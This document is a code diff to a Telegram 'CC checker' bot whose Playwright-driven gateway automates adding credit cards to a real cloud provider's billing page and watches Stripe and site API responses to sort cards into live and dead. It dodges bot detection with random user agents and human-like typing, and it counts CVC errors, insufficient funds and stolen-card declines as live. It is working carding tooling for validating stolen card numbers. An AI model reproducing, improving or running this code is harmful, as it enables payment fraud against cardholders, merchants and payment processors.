@@ -3,7 +3,7 @@
 
 """
 Obeida Online - Free Multi Gateway CC Checker Bot
-Version: 22.0 - Enhanced Real Check Gateway with Stripe API Monitoring
+Version: 23.0 - Real Check Gateway with API Monitoring
 Author: @ObeidaOnline
 Channel: https://t.me/ObeidaTrading
 """
@@ -423,7 +423,7 @@ class StripeGateway:
         except Exception as e:
             return False, f"⚠️ خطأ"
 
-# ==================== بوابة Real Check (معدلة مع مراقبة Stripe API) ====================
+# ==================== بوابة Real Check (معدلة لمراقبة API الصحيح) ====================
 class RealCheckGateway:
     
     def __init__(self):
@@ -461,9 +461,9 @@ class RealCheckGateway:
         random_ua = random.choice(self.user_agents)
         random_viewport = random.choice(self.viewports)
         
-        # متغيرات لتخزين نتيجة الفحص
-        check_result = {"approved": None, "message": None}
-        check_complete = threading.Event()
+        # متغير لتخزين نتيجة الفحص من API
+        card_result = {"approved": None, "message": None, "card_id": None}
+        response_received = threading.Event()
         
         try:
             async with async_playwright() as p:
@@ -484,77 +484,56 @@ class RealCheckGateway:
                 password = "Obeida059@"
                 name = card_data.get('name', 'Card Holder')
                 
-                # مراقبة ردود Stripe API
+                # ========== مراقبة API الصحيح ==========
                 async def handle_response(response):
                     try:
                         url = response.url()
                         
-                        # التركيز على ردود Stripe المهمة
-                        if 'api.stripe.com' in url and ('payment_intents' in url or 'payment_methods' in url or 'confirm' in url):
+                        # ✅ التركيز على API إضافة البطاقة
+                        if 'api/v0/billing/cards/' in url and response.status == 200:
                             try:
                                 data = await response.json()
                                 
-                                # ✅ نجاح البطاقة
-                                if data.get('status') == 'succeeded':
-                                    check_result["approved"] = True
-                                    check_result["message"] = "✅ البطاقة مقبولة"
-                                    check_complete.set()
+                                # ✅ بطاقة مقبولة - يوجد id و brand و last4
+                                if data and isinstance(data, dict) and data.get('id'):
+                                    card_result["approved"] = True
+                                    card_result["message"] = "✅ البطاقة مقبولة"
+                                    card_result["card_id"] = data.get('id')
+                                    response_received.set()
                                     return
                                 
-                                # ❌ رفض البطاقة مع تحليل السبب
-                                if data.get('last_payment_error'):
-                                    error = data.get('last_payment_error')
-                                    error_code = error.get('code', '')
-                                    error_message = error.get('message', '').lower()
+                                # ❌ بطاقة مرفوضة - الرد فارغ أو []
+                                elif not data or (isinstance(data, list) and len(data) == 0):
+                                    card_result["approved"] = False
+                                    card_result["message"] = "❌ البطاقة مرفوضة"
+                                    response_received.set()
+                                    return
                                     
-                                    # CVV خطأ (بطاقة حية)
-                                    if 'cvv' in error_message or 'security' in error_message or error_code == 'incorrect_cvc':
-                                        check_result["approved"] = True
-                                        check_result["message"] = "✅ البطاقة مقبولة"
-                                        check_complete.set()
-                                        return
-                                    
-                                    # رصيد غير كافي (بطاقة حية)
-                                    elif 'insufficient' in error_message or error_code == 'insufficient_funds':
-                                        check_result["approved"] = True
-                                        check_result["message"] = "✅ البطاقة مقبولة"
-                                        check_complete.set()
-                                        return
-                                    
-                                    # بطاقة مسروقة أو مفقودة (بطاقة حية)
-                                    elif 'stolen' in error_message or 'lost' in error_message:
-                                        check_result["approved"] = True
-                                        check_result["message"] = "✅ البطاقة مقبولة"
-                                        check_complete.set()
-                                        return
-                                    
-                                    # رفض عادي
-                                    else:
-                                        check_result["approved"] = False
-                                        check_result["message"] = "❌ البطاقة مرفوضة"
-                                        check_complete.set()
-                                        return
+                            except Exception as e:
+                                pass
+                        
+                        # مراقبة أخطاء Stripe API
+                        if 'api.stripe.com' in url and ('payment_intents' in url or 'payment_methods' in url):
+                            try:
+                                data = await response.json()
                                 
-                                # خطأ في إنشاء payment method
                                 if data.get('error'):
                                     error = data.get('error')
                                     error_code = error.get('code', '')
                                     error_message = error.get('message', '').lower()
                                     
-                                    if 'cvv' in error_message or 'security' in error_message:
-                                        check_result["approved"] = True
-                                        check_result["message"] = "✅ البطاقة مقبولة"
-                                        check_complete.set()
+                                    # CVV خطأ - بطاقة حية
+                                    if 'cvv' in error_message or 'security' in error_message or error_code == 'incorrect_cvc':
+                                        card_result["approved"] = True
+                                        card_result["message"] = "✅ البطاقة مقبولة"
+                                        response_received.set()
                                         return
+                                    
+                                    # رصيد غير كافي - بطاقة حية
                                     elif 'insufficient' in error_message:
-                                        check_result["approved"] = True
-                                        check_result["message"] = "✅ البطاقة مقبولة"
-                                        check_complete.set()
-                                        return
-                                    else:
-                                        check_result["approved"] = False
-                                        check_result["message"] = "❌ البطاقة مرفوضة"
-                                        check_complete.set()
+                                        card_result["approved"] = True
+                                        card_result["message"] = "✅ البطاقة مقبولة"
+                                        response_received.set()
                                         return
                                         
                             except:
@@ -565,6 +544,7 @@ class RealCheckGateway:
                 
                 page.on('response', handle_response)
                 
+                # ========== تنفيذ خطوات الفحص ==========
                 await page.goto("https://cloud.vast.ai/create/", timeout=30000)
                 await asyncio.sleep(random.uniform(1.5, 2.5))
                 
@@ -612,15 +592,12 @@ class RealCheckGateway:
                 await self.type_like_human(page, "#billingPostalCode", "90003")
                 await asyncio.sleep(random.uniform(0.3, 0.6))
                 
-                # الضغط على زر الإضافة
+                # ========== الضغط على زر إضافة البطاقة ==========
                 await page.locator('div.SubmitButton-IconContainer').click()
                 
-                # انتظار النتيجة من Stripe
-                await asyncio.sleep(2)
-                
-                # انتظار اكتمال الفحص (حد أقصى 20 ثانية)
+                # ========== انتظار الرد من API ==========
                 try:
-                    await asyncio.wait_for(check_complete.wait(), timeout=20)
+                    await asyncio.wait_for(response_received.wait(), timeout=25)
                 except:
                     pass
                 
@@ -630,35 +607,36 @@ class RealCheckGateway:
                 
                 await browser.close()
                 
-                # إذا تم الحصول على نتيجة من Stripe
-                if check_result["approved"] is not None:
-                    return check_result["approved"], check_result["message"]
+                # ========== تحليل النتيجة بناءً على API ==========
+                if card_result["approved"] is True:
+                    return True, card_result["message"]
                 
-                # تحليل إضافي من URL ومحتوى الصفحة
+                if card_result["approved"] is False:
+                    return False, card_result["message"]
+                
+                # ========== تحليل إضافي في حال لم يصل رد API ==========
                 combined_text = (current_url + " " + page_content).lower()
                 
-                # كلمات النجاح
-                success_keywords = [
-                    'billing?session_id=', 'payment method added', 'successfully added',
-                    'card added', 'payment method saved', 'setup succeeded',
-                    'thank you', 'confirmation', 'completed'
-                ]
-                
-                for keyword in success_keywords:
-                    if keyword in combined_text:
-                        return True, "✅ البطاقة مقبولة"
-                
+                # التحقق من وجود session_id في URL
                 if 'billing?session_id=' in current_url:
                     return True, "✅ البطاقة مقبولة"
                 
-                if 'payment-methods' in current_url and 'billing' in current_url:
+                # التحقق من وجود البطاقة في صفحة البطاقات
+                if 'payment-methods' in current_url and card_data['number'][-4:] in page_content:
                     return True, "✅ البطاقة مقبولة"
                 
+                # التحقق من أخطاء Stripe
                 if 'stripe.com' in current_url:
                     if 'cvv' in combined_text or 'security' in combined_text:
                         return True, "✅ البطاقة مقبولة"
                     if 'insufficient' in combined_text:
                         return True, "✅ البطاقة مقبولة"
+                    if 'declined' in combined_text:
+                        return False, "❌ البطاقة مرفوضة"
+                
+                # التحقق من وجود id في الصفحة (من API)
+                if 'id' in combined_text and card_data['number'][-4:] in combined_text:
+                    return True, "✅ البطاقة مقبولة"
                 
                 return False, "❌ البطاقة مرفوضة"
                         
